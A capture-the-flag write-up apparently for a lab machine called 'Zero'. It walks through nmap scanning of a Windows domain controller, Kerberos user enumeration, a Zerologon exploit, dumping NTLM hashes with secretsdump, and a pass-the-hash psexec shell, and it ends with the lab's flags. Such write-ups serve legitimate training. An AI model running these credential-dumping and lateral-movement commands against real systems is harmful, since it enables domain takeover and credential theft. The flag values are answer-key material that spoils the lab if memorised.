# ZERO / Active Directory

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/5c7dbc78966d4e10a5a210a22e3f3906.png)

## NMAP SCAN

```text
sudo nmap -sC -sV -p- 172.31.1.29 -vv
```

{% hint style="info" %}
You can use the alias function in your .zshrc or .bashrc located in your home directory.

Like: `alias nscan='sudo nmap -sC -sV -vv -p-' to only use nscan 172.31.1.29`
{% endhint %}

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-15 19:50:22Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: Zero.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: Zero.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ZERO
|   NetBIOS_Domain_Name: ZERO
|   NetBIOS_Computer_Name: ZERO-DC
|   DNS_Domain_Name: Zero.csl
|   DNS_Computer_Name: Zero-DC.Zero.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-15T21:13:56+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49751/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49883/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## ADD THE DNS DOMAIN NAME TO YOUR /ETC/HOSTS

```text
Zero.csl
```

## SMB ENUMERATION

* Nothing to see here 😡 

## KERBEROS ENUMERATION

### USER ENUMERATION

```text
kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain ZERO -dc-ip Zero.csl
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/a7e35ecbdd6844579fb1c749a110b3b2.png)

### ASREPRoast

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/6999a81a61634f8e8095f3f45465411f.png)

## LDAP ENUMERATION

```text
nmap -n -sV --script "ldap* and not brute" -p 389 Zero.csl
```

```text
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: Zero.csl, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
------------REDACTED---------------
```

## ZERO LOGON

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/70c82ba94ddb472c9a8c2a7e27d44376.png)

```text
sudo secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '/ZERO-DC$@172.31.1.29'
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/e30861999e9346ee8c2170db00ffd24e.png)

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a190af9837b4381407a3b689e0c839cf:::
jared:1104:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
ZERO-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## GET SHELL

```text
psexec.py Administrator@172.31.1.29 -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/b55925decef349b3ab8c54f90ad89deb.png)

## FLAGS

### USER

```text
d839c4ab769c3bb84207b7ec6808b1e2
```

### ROOT

```text
ba08f724b22cd1d3cf890e45b3acd4de
```


